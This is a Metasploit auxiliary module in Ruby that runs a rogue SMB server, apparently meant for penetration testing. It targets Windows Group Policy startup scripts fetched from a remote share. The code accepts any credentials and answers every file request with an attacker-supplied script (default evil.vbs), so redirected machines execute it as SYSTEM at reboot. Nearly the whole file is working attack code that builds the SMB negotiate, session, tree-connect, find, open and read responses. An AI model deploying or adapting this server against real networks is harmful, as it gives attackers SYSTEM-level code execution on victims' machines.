##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SMBServer

  def initialize
    super(
      'Name'        => 'Malicious SMB Server (Bad Samba)',
      'Description'    => """
	This module is used to exploit startup script execution through Windows Group
	Policy settings when configured to run off of a remote SMB share.

	Windows Group Policy can be used to configure startup scripts that will execute
	each time the operating system powers on. These scripts execute with a
	high-level of privilege, the NT AUTHORITY/SYSTEM account.

	If an attacker is able to perform traffic manipulation attacks and redirect 
	traffic flow to the malicious SMB server during reboot, it is possible to
	execute commands remotely as the SYSTEM account. 

	This module will accept all forms of authentication whether that be anonymous,
	domain, blank password, non-existent accounts. It will allow any user to connect
	to the SMB server and share. 

	It will also perform file spoofing and serve up the same file regardless
	of what file was originally requested, and regardless of which SMB share the 
	client is connected to. If the user requests foo.vbs it will send them evil.vbs. 

	This was tested on Windows 7 Service Pack 1 (x86) using .bat and .vbs scripts. 
      """,
      'Author'      => 'Sam Bertram <sbertram[at]gdssecurity.com>',
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Sniffer' ]
        ],
      'DefaultAction'  => 'Sniffer'
    )

    register_options(
      [
        OptString.new('FILE',        [ true, "The malicious file that will be served for every file retrieval request", "/root/evil.vbs" ]),
        OptString.new('DOMAIN_NAME', [ true, "The domain name used during SMB protocol negotiation", "WORKGROUP" ])
      ], self.class)

    register_advanced_options(
      [
        OptString.new('CHALLENGE',   [ true, "The 8 byte challenge ", "1122334455667788" ]),
      ], self.class)
  end

  def run

    # global verbosity
    @verbose = datastore['VERBOSE']

    @domain_name = datastore['DOMAIN_NAME']

    # get information about the payload file
    @file = ::File.expand_path(datastore['FILE']) # /root/evil.vbs
    @filename = ::File.basename(@file) # evil.vbs

    # validate that the file actually exists within the filesystem
    if(not ::File.exists?(@file))
      print_error("The payload file specified '#{@file}' does not exist within the filesystem.")
      return
    end

    @filesize = ::File.size(@file)

    # requested filename, defaults to filename, will be updated with each smb request
    @rfilename = @filename

    print_status("Serving up '#{@file} (#{@filesize} bytes)'")

    @s_GUID = [Rex::Text.rand_text_hex(32)].pack('H*')
    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{16})$/
      @challenge = [ datastore['CHALLENGE'] ].pack("H*")
    else
      print_error("CHALLENGE syntax must match 1122334455667788")
      return
    end

    @time = Time.now.to_i
    @hi, @lo = UTILS.time_unix_to_smb(@time)

    exploit()
     
  end

  def smb_cmd_dispatch(cmd, c, buff)

    smb = @state[c]

    pkt = CONST::SMB_BASE_PKT.make_struct
    pkt.from_s(buff)

    # record the id's for the smb_set_defaults function
    smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
    smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
    smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
    smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']

    # switch on all valid commands
    case cmd

      # the following are all explicitly required in order to handle the SMB
      # session, and have an SMB server that can serve to Windows 7 (SP1)
      # clients with group policy script execution is enabled 
      when CONST::SMB_COM_NEGOTIATE then smb_cmd_negotiate(cmd, c, buff, smb)
      when CONST::SMB_COM_SESSION_SETUP_ANDX then smb_cmd_session_setup(cmd, c, buff, smb)
      when CONST::SMB_COM_TREE_CONNECT_ANDX then smb_cmd_tree_connect(cmd, c, buff, smb)
      when CONST::SMB_COM_TRANSACTION2 then smb_cmd_trans2(cmd, c, buff, smb)
      when CONST::SMB_COM_OPEN_ANDX then smb_cmd_open_andx(cmd, c, buff, smb)
      when CONST::SMB_COM_READ_ANDX then smb_cmd_read_andx(cmd, c, buff, smb)

      # the following commmands will all return a status success upon requested

      # tree disconnect 
      when CONST::SMB_COM_TREE_DISCONNECT
        if @verbose == true then print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_TREE_DISCONNECT") end
        smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS)

      # close request
      when CONST::SMB_COM_CLOSE
        if @verbose == true then print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_CLOSE") end
        smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS)

     # echo request
      when CONST::SMB_COM_ECHO
        if @verbose == true then print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_ECHO") end
        smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS)

      # otherwise, alert and error with access denied on unknown commands 
      else
        if @verbose == true then print_status("#{smb[:name]}/#{smb[:user_id]}: UNKNOWN/UNEXPECTED/NOT CONFIGURED (#{cmd})") end
        smb_error(cmd, c, CONST::SMB_STATUS_ACCESS_DENIED)

    end
  end

  def smb_cmd_negotiate(cmd, c, buff, smb)

    # get negotiation dialects
    recv_pkt = CONST::SMB_NEG_PKT.make_struct
    recv_pkt.from_s(buff)
    dialects = recv_pkt['Payload'].v['Payload'].gsub(/\x00/, '').split(/\x02/).grep(/^\w+/)

    print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_NEGOTIATE (Dialects: #{dialects.join(", ")})")

    pkt = CONST::SMB_NEG_RES_NT_PKT.make_struct
    smb_set_defaults(c, pkt)

    time_hi, time_lo = UTILS.time_unix_to_smb(Time.now.to_i)

    dialect =
      dialects.index("NT LM 0.12") ||
      dialects.length-1

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NEGOTIATE
    pkt['Payload']['SMB'].v['Flags1'] = 0x88
    pkt['Payload']['SMB'].v['Flags2'] = 0xc001
    pkt['Payload']['SMB'].v['WordCount'] = 17
    pkt['Payload'].v['Dialect'] = dialect
    pkt['Payload'].v['SecurityMode'] = 3
    pkt['Payload'].v['MaxMPX'] = 2
    pkt['Payload'].v['MaxVCS'] = 1
    pkt['Payload'].v['MaxBuff'] = 4356
    pkt['Payload'].v['MaxRaw'] = 65536
    pkt['Payload'].v['Capabilities'] = 0x0080000d # UNIX extensions; large files; unicode; raw mode
    pkt['Payload'].v['ServerTime'] = time_lo
    pkt['Payload'].v['ServerDate'] = time_hi
    pkt['Payload'].v['Timezone']   = 0x0

    pkt['Payload'].v['SessionKey'] = 0
    pkt['Payload'].v['KeyLength'] = 8

    pkt['Payload'].v['Payload'] = @challenge +
      Rex::Text.to_unicode(@domain_name) + "\x00\x00" +
      Rex::Text.to_unicode("") + "\x00\x00"

    c.put(pkt.to_s)
  end

  def smb_cmd_session_setup(cmd, c, buff, smb)

    # only inform if verbose is enabled, as it will be quite noisy
    if @verbose == true then print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_SESSION_SETUP_ANDX") end

    pkt = CONST::SMB_SETUP_RES_PKT.make_struct
    smb_set_defaults(c, pkt)

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
    pkt['Payload']['SMB'].v['Flags1'] = 0x98
    pkt['Payload']['SMB'].v['Flags2'] = 0xc807
    pkt['Payload']['SMB'].v['WordCount'] = 0x03
    pkt['Payload'].v['AndX'] = 0xff # no further commands
    pkt['Payload'].v['Reserved1'] = 0x00 # reserved
    pkt['Payload'].v['AndXOffset'] = 0x0000 # 

    pkt['Payload'].v['Action'] = 0x0001 # Logged in as Guest, not logged in as guest is 0

    pkt['Payload'].v['Payload'] =
      Rex::Text.to_unicode("Unix", 'utf-16be') + "\x00\x00" + # Native OS
      Rex::Text.to_unicode("Bad Samba", 'utf-16be') + "\x00\x00" + # Native LAN Manager # Samba signature
      Rex::Text.to_unicode(@domain_name, 'utf-16be') + "\x00\x00\x00" # Primary DOMAIN # Samba signature

    c.put(pkt.to_s)
  end

  
  def smb_cmd_tree_connect(cmd, c, buff, smb)

    recv_pkt = CONST::SMB_TREE_CONN_PKT.make_struct
    recv_pkt.from_s(buff)

    # the payload is the path, \x00\x00, then the service till the end
    payload = recv_pkt['Payload'].v['Payload']
    payloads = payload.split(/\x00\x00/,2)

    path = payloads.first
    service = payloads.last
    
    # submit access denied request to IPC
    if payload.include? Rex::Text.to_unicode('\IPC$')

      # as this is requested multiple times, and is quite noisy only inform the user if verbose is enabled
      if @verbose == true then print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_TREE_CONNECT_ANDX (Path: #{path})") end
       smb_error(cmd, c, 0xc000003a) # STATUS_OBJECT_PATH_NOT_FOUND

    # all other requests specify an NTFS file partition
    else

      # notify the user, but don't print the service if it is only ?????
      (service.include? "?????") ? print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_TREE_CONNECT_ANDX (Path: #{path})") : print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_TREE_CONNECT_ANDX (Path: #{path}; Service: #{service})")

      pkt = CONST::SMB_TREE_CONN_RES_PKT.make_struct
      smb_set_defaults(c, pkt)

      pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TREE_CONNECT_ANDX
      pkt['Payload']['SMB'].v['Flags1'] = 0x98
      pkt['Payload']['SMB'].v['Flags2'] = 0xc807
      pkt['Payload']['SMB'].v['WordCount'] = 0x07

      pkt['Payload'].v['AndX'] = 0xff # No further commands,  
      pkt['Payload'].v['Reserved1'] = 0x00
      pkt['Payload'].v['AndXOffset'] = 0x0000
      pkt['Payload'].v['OptionalSupport'] = 0x0001
      pkt['Payload'].v['SupportWords'] =
        "\xbf\x01\x13\x00" + # maximal share access rights
        "\x00\x00\x00\x00"   # guest maximal share access rights
      pkt['Payload'].v['Payload'] =
        "A:" + "\x00" + # Service: A:
        Rex::Text.to_unicode("NTFS", 'utf-16le') + "\x00\x00" # NTFS file system

      c.put(pkt.to_s)
    end
  end

  # trans2 method that will seperate it depending on the sub_command received
  def smb_cmd_trans2(cmd, c, buff, smb)
    recv_pkt = CONST::SMB_TRANS2_PKT.make_struct
    recv_pkt.from_s(buff)

    # determine what type of TRANS2 command it is
    sub_command = recv_pkt['Payload'].v['SetupData'].unpack("v").first

    # switch on trans2 sub command
    case sub_command
      when CONST::TRANS2_FIND_FIRST2 then smb_cmd_trans2_find_first2(cmd, c, buff, smb) # FIND_FIRST2

      # if no command, alert on verbose logging, and give access denied
      else
        if @verbose == true then print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_TRANSACTION2 Subcommand is UNKNOWN/UNEXPECTED/NOT CONFIGURED (#{sub_command})") end
        smb_error(cmd, c, 0xc0000022) # SMB_STATUS_ACCESS_DENIED
      end
  end

  # when a request for a specific pattern comes in, only show that specific file
  # for windows 7 gpo scrip startup, only 'find file both directory info' is required
  def smb_cmd_trans2_find_first2(cmd, c, buff, smb)

    # get the requested pattern of the find_first2 command
    recv_pkt = CONST::SMB_TRANS2_PKT.make_struct
    recv_pkt.from_s(buff)

    payload = recv_pkt['Payload'].to_s
    offset = recv_pkt['Payload'].v['ParamOffset']

    # 6 bytes to skip to the Level of Interest parameter
    recv_interest = payload[(offset + 6)..(offset + 6 + 1)].unpack("v").first

    # 12 bytes to skip to the Search Pattern parameter
    recv_filename = payload[(offset + 12)..payload.length] 

    # remove the leading \ from the received filename
    if recv_filename[0..1] == "\x5c\x00" then filename = recv_filename[1..-2] # strip the / unicode
    elsif recv_filename[0..0] == "\x5c" then filename = recv_filename[1..-1]  # strip the / ascii
    else filename = recv_filename end # default to received filename

    # if default search request, the dir command of *, then return our evil filename
    if filename[0..1] == "\x00\x2a" or filename[0..0] == "\x2a" then filename = Rex::Text.to_unicode(@filename) end
    
    # strip nulls, and encode with unicode. this will also strip out tailing \x00s
    if filename[0..0] == "\x00" then filename =  Rex::Text.to_unicode(filename.gsub(/\x00/,'')) end

    # start to build the response
    pkt = CONST::SMB_TRANS_RES_PKT.make_struct
    smb_set_defaults(c, pkt)

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
    pkt['Payload']['SMB'].v['Flags1'] = 0x98
    pkt['Payload']['SMB'].v['Flags2'] = 0xc807
    pkt['Payload']['SMB'].v['WordCount'] = 10
    pkt['Payload'].v['ParamCountTotal'] = 10
 
    case recv_interest

      when 0x0104 # Find File Both Directory Info

          # occurs during Windows XP group policy reboot
          print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_TRANSACTION2 (Subcommand: FIND_FIRST2 (0x0001); Search Pattern: '#{recv_filename}'; Find File Both Directory Info 0x0104)")

          # calculate filename offset
          pkt['Payload'].v['DataCountTotal'] = 94 + filename.length
          pkt['Payload'].v['ParamCount'] = 10
          pkt['Payload'].v['ParamOffset'] = 56
          pkt['Payload'].v['DataCount'] = 94 + filename.length
          pkt['Payload'].v['DataOffset'] = 68
          pkt['Payload'].v['Payload'] = "\x00" + # Padding

          # FIND_FIRST2 Parameters
          "\xfd\xff" + # Search ID
          "\x01\x00" + # Search count; 1
          "\x01\x00" + # End Of Search
          "\x00\x00" + # EA Error Offset
          "\x00\x00" + # Last Name Offset
          "\x00\x00" + # Padding
    
          # FIND_FIRST2 Data
          "\x00\x00\x00\x00" + # Next Entry Offset
          "\x00\x00\x00\x00" + # File Index
          [@lo, @hi].pack("VV") + # Created
          [@lo, @hi].pack("VV") + # Last Access
          [@lo, @hi].pack("VV") + # Last Write
          [@lo, @hi].pack("VV") + # Change
          [@filesize].pack("V") + "\x00\x00\x00\x00" + # End Of File
          [@filesize].pack("V") + "\x00\x00\x00\x00" + # Allocation size
          "\x80\x00\x00\x00" + # File Attributes
          [filename.length].pack("V") + # File Name Len
          "\x00\x00\x00\x00" + # EA List Length
          "\x18" + # Short file Length, 24 bytes
          "\x00" + # Reserved
          ("\x00" * 24) + # Short File Name
          filename
      
          c.put(pkt.to_s)

      else

          # only warn on other find_first commands is verbose logging is enabled
          if @verbose == true then print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_TRANSACTION2 (Subcommand: FIND_FIRST2 (0x0001); Search Pattern: '#{filename}'; UNKNOWN/UNEXPECTED)") end
          smb_error(CONST::SMB_COM_TRANSACTION2, c, 0xc0000022) # SMB_STATUS_ACCESS_DENIED

    end

  end


  # any path query_path_info, depending on the received path will then determine
  # if it's a file or a directory
  def smb_cmd_trans2_query_path_info(cmd, c, buff, smb)

    # get the requested pattern of the find_first2 command
    recv_pkt = CONST::SMB_TRANS2_PKT.make_struct
    recv_pkt.from_s(buff)

    payload = recv_pkt['Payload'].to_s
    offset = recv_pkt['Payload'].v['ParamOffset']

    # 1 byte used to represent the interest
    recv_interest = payload[offset..(offset + 1)].unpack("v").first

    # 6 bytes to skip to the filename
    recv_filename = payload[(offset + 6)..payload.length]

    # the attributes of the file/directory will change depending on the type of request
    if recv_filename[0..1] == "\x00\x00" then attributes = "\x10\x00\x00\x00" # is a directory
    else attributes = "\x20\x00\x00\x00" end # is a file

    print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_TRANSACTION2 (Subcommand: QUERY_PATH_INFO (0x5); Search Pattern: '#{recv_filename}'; UNKNOWN/UNEXPECTED)")
    smb_error(CONST::SMB_COM_TRANSACTION2, c, 0xc0000022) # SMB_STATUS_ACCESS_DENIED
 
  end

  # all open_andx requests will give details about the malicious file
  def smb_cmd_open_andx(cmd, c, buff, smb)

    recv_pkt = CONST::SMB_OPEN_PKT.make_struct
    recv_pkt.from_s(buff)
    payload = recv_pkt['Payload'].v['Payload']

    # a filename will always start with a \, so remove the leading byte from
    # the received payload, unless it's a \. this is purely for logging to the
    # user about the file requested
    if payload[1..2] == "\x5c\x00" then payload = payload[1..-2]     # strip the \ unicode
    elsif payload[1..1] == "\x5c" then payload = payload[1..-1]  end # strip the \ ascii

    print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_OPEN_ANDX (File: #{payload})")

    pkt = CONST::SMB_OPEN_RES_PKT.make_struct
    smb_set_defaults(c, pkt)

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_OPEN_ANDX
    pkt['Payload']['SMB'].v['Flags1'] = 0x98
    pkt['Payload']['SMB'].v['Flags2'] = 0xc807
    pkt['Payload']['SMB'].v['WordCount'] = 34

    pkt['Payload'].v['AndX'] = 0xff # no further commands
    pkt['Payload'].v['FileID'] = rand(0x7fff) + 1 # random file id; avoid 0
    pkt['Payload'].v['WriteTime'] = @hi
    pkt['Payload'].v['FileSize'] = @filesize.to_i
    pkt['Payload'].v['FileType'] = 0x0000 # is a disk file
    pkt['Payload'].v['IPCState'] = 0x0000 # no IPC state
    pkt['Payload'].v['Action'] = 0x00001 # file existed, and was opened

    c.put(pkt.to_s)

  end

  # read andx
  def smb_cmd_read_andx(cmd, c, buff, smb)

    # get the offsets about the file being read
    recv_pkt = CONST::SMB_READ_PKT.make_struct
    recv_pkt.from_s(buff)
    offset = recv_pkt['Payload'].v['Offset'].to_i
    req_length = recv_pkt['Payload'].v['MaxCountLow']

    payload = ::File.binread(@file, req_length, offset)
    payload_len = payload.to_s.length

    # alert the user
    print_status("#{smb[:name]}/#{smb[:user_id]}: SMB_COM_READ_ANDX (Sending #{payload_len} of #{req_length} requested bytes at offset #{offset})")

    # build the packet to send
    pkt = CONST::SMB_READ_RES_PKT.make_struct
    smb_set_defaults(c, pkt)

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_READ_ANDX
    pkt['Payload']['SMB'].v['Flags1'] = 0x98
    pkt['Payload']['SMB'].v['Flags2'] = 0xc807
    pkt['Payload']['SMB'].v['WordCount'] = 12

    pkt['Payload'].v['AndX'] = 0xff # no further commands
    pkt['Payload'].v['Remaining'] = 0xffff # 65535
    pkt['Payload'].v['DataLenLow'] = payload_len # the number of bytes read
    pkt['Payload'].v['DataLenHigh'] = 0 # multiply with 64k
    pkt['Payload'].v['DataOffset'] = 0x3b # 56

    # only append the payload, if data was read from the file
    if payload_len > 0 then pkt['Payload'].v['Payload'] = payload end

    c.put(pkt.to_s)

  end

end

